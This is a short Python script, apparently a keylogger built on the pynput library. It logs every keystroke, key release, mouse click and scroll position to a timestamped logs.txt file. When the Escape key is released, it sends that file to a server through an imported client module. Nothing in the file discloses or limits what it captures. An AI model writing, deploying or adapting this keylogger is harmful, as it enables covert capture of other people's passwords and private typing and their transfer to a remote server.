from pynput import keyboard
from pynput.mouse import Listener
import logging
from client import send

log_dir = ""

logging.basicConfig(filename=(log_dir + "logs.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    try:
        logging.info('{0} pressed'.format(
            key.char))
    except AttributeError:
        logging.info('{0} pressed'.format(
            key))

def on_release(key):
    logging.info('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Send file to server
        send("logs.txt")

def on_click(x, y, button, pressed):
    if pressed:
        logging.info('"{0}", {1}'.format(button, (x, y)))

def on_scroll(x, y, dx, dy):
    logging.info('"{0}", {1}'.format('Button.scroll', (x, y)))        

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

with Listener(on_click=on_click, on_scroll=on_scroll) as listener:
    listener.join()    
